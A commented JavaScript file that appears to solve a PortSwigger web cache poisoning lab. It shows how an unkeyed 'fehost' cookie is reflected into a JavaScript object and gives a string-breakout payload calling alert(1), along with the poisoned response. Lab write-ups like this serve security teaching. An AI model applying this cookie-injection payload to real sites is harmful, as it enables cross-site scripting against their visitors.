// The payload at the end of this file is meant to solve the following lab:
// https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-with-an-unkeyed-cookie

// Looking at the cookies in the request we'll find the following:
// fehost=prod-cache-01

// Looking for a reflection of "prod-cache-01" in the servers response we'll find the following JavaScript object:
/*
data = {
    "host":"[SUB_DOMAIN].web-security-academy.net",
    "path":"/",
    "frontend":"prod-cache-01"
}
*/

// Changing the value of the cookie will cause the new value to be reflected as well.

// The following payload can be used to solve the lab:

// fehost=hello" - alert(1) - "world

// Response:
/*
data = {
    "host":"[SUB_DOMAIN].web-security-academy.net",
    "path":"/",
    "frontend":"hello" - alert(1) - "world"
}
*/
